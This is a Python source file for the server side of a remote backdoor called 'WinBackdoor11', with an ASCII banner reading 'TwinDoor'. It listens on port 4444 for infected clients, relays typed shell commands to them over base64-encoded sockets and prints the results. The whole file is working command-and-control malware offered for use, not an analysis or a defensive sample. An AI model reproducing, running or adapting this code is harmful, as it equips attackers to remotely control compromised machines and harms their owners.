# server/control_panel.py

import socket
import threading
import base64

# === ASCII Banner ===
BANNER = r"""
 /$$$$$$$$            /$$           /$$$$$$$                               
|__  $$__/           |__/          | $$__  $$                              
   | $$ /$$  /$$  /$$ /$$ /$$$$$$$ | $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$ 
   | $$| $$ | $$ | $$| $$| $$__  $$| $$  | $$ /$$__  $$ /$$__  $$ /$$__  $$
   | $$| $$ | $$ | $$| $$| $$  \ $$| $$  | $$| $$  \ $$| $$  \ $$| $$  \__/
   | $$| $$ | $$ | $$| $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$      
   | $$|  $$$$$/$$$$/| $$| $$  | $$| $$$$$$$/|  $$$$$$/|  $$$$$$/| $$      
   |__/ \_____/\___/ |__/|__/  |__/|_______/  \______/  \______/ |__/      
                                                                          
                                                                          
                                                                          
"""

# === Server Configuration ===
LISTEN_HOST = "0.0.0.0"      # Listen on all interfaces
LISTEN_PORT = 4444           # Must match the client’s SERVER_PORT

# === Send/Receive with Base64 ===
def reliable_send(conn, data):
    try:
        encoded = base64.b64encode(data.encode())
        conn.send(encoded)
    except:
        pass

def reliable_recv(conn):
    data = b""
    while True:
        try:
            chunk = conn.recv(1024)
            if not chunk:
                break
            data += chunk
            try:
                return base64.b64decode(data).decode()
            except:
                continue
        except:
            break
    return ""

# === Handle a Connected Client ===
def handle_client(conn, addr):
    print(f"[+] New connection from {addr[0]}:{addr[1]}")
    
    welcome = reliable_recv(conn)
    print("[*] Client says:", welcome)
    
    try:
        while True:
            command = input("WinBackdoor11 > ")
            if command.strip().lower() in ["exit", "quit"]:
                break
            if not command.strip():
                continue
            reliable_send(conn, command)
            result = reliable_recv(conn)
            print(result)
    except KeyboardInterrupt:
        print("\n[!] Closing connection.")
    finally:
        conn.close()

# === Start Listening for Backdoor Connections ===
def start_server():
    print(BANNER)
    print(f"[*] Listening on {LISTEN_HOST}:{LISTEN_PORT}...\n")

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind((LISTEN_HOST, LISTEN_PORT))
    server_sock.listen(5)

    while True:
        client_sock, client_addr = server_sock.accept()
        thread = threading.Thread(target=handle_client, args=(client_sock, client_addr))
        thread.start()

if __name__ == "__main__":
    start_server()
